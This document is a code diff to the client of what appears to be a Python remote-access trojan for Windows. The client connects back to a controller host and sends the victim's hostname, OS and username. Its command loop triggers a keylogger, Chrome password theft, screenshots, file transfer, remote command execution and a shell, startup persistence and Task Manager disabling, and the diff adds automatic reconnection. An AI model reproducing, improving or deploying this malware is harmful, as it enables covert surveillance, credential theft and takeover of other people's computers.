@@ -19,17 +19,20 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     sys.exit(0)
 
 
-while True:  # infinite loop until socket can connect
-    try:
-        objSocket = socket.socket()
-        objSocket.connect((strHost, intPort))
-    except socket.error:
-        time.sleep(5)  # wait 5 seconds to try again
-    else: break
+def server_connect():
+    global objSocket
+    while True:  # infinite loop until socket can connect
+        try:
+            objSocket = socket.socket()
+            objSocket.connect((strHost, intPort))
+        except socket.error:
+            time.sleep(5)  # wait 5 seconds to try again
+        else: break
 
-strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
-objSocket.send(str.encode(strUserInfo))
-del strUserInfo  # delete data after it has been sent
+    strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + "`," + os.environ["USERNAME"]
+    objSocket.send(str.encode(strUserInfo))
+
+server_connect()
 
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8")
@@ -327,53 +330,57 @@ def run_command(command):
     objSocket.send(bytData)  # send output
 
 
-try:
-    while True:
-        strData = objSocket.recv(1024)
-        strData = decode_utf8(strData)
+while True:
+    try:
+        while True:
+            strData = objSocket.recv(1024)
+            strData = decode_utf8(strData)
 
-        if strData == "exit":
-            objSocket.close()
-            keylogger("stop")
-            sys.exit(0)
-        elif strData[:3] == "msg":
-            MessageBox(strData[3:])
-        elif strData[:4] == "site":
-            webbrowser.get().open(strData[4:])
-        elif strData == "startup":
-            startup()
-        elif strData == "screen":
-            screenshot()
-        elif strData == "filebrowser":
-            file_browser()
-        elif strData[:4] == "send":
-            upload(strData[4:])
-        elif strData[:4] == "recv":
-            receive(strData[4:])
-        elif strData == "lock":
-            lock()
-        elif strData == "shutdown":
-            shutdown("-s")
-        elif strData == "restart":
-            shutdown("-r")
-        elif strData == "test":
-            continue
-        elif strData == "cmd":
-            command_shell()
-        elif strData == "chrpass":
-            chrpass()
-        elif strData == "keystart":
-            keylogger("start")
-        elif strData == "keystop":
-            keylogger("stop")
-        elif strData == "keydump":
-            keylogger("dump")
-        elif strData[:6] == "runcmd":
-            run_command(strData[6:])
-        elif strData == "dtaskmgr":
-            if not "blnDisabled" in globals():  # if the variable doesnt exist yet
-                blnDisabled = "True"
-            disable_taskmgr()
-except socket.error:  # if the server closes without warning
-    objSocket.close()
-    sys.exit(0)
+            if strData == "exit":
+                objSocket.close()
+                keylogger("stop")
+                sys.exit(0)
+            elif strData[:3] == "msg":
+                MessageBox(strData[3:])
+            elif strData[:4] == "site":
+                webbrowser.get().open(strData[4:])
+            elif strData == "startup":
+                startup()
+            elif strData == "screen":
+                screenshot()
+            elif strData == "filebrowser":
+                file_browser()
+            elif strData[:4] == "send":
+                upload(strData[4:])
+            elif strData[:4] == "recv":
+                receive(strData[4:])
+            elif strData == "lock":
+                lock()
+            elif strData == "shutdown":
+                shutdown("-s")
+            elif strData == "restart":
+                shutdown("-r")
+            elif strData == "test":
+                continue
+            elif strData == "cmd":
+                command_shell()
+            elif strData == "chrpass":
+                chrpass()
+            elif strData == "keystart":
+                keylogger("start")
+            elif strData == "keystop":
+                keylogger("stop")
+            elif strData == "keydump":
+                keylogger("dump")
+            elif strData[:6] == "runcmd":
+                run_command(strData[6:])
+            elif strData == "dtaskmgr":
+                if not "blnDisabled" in globals():  # if the variable doesnt exist yet
+                    blnDisabled = "True"
+                disable_taskmgr()
+    except socket.error:  # if the server closes without warning
+        objSocket.close()
+        del objSocket
+        server_connect()
+
+# eof
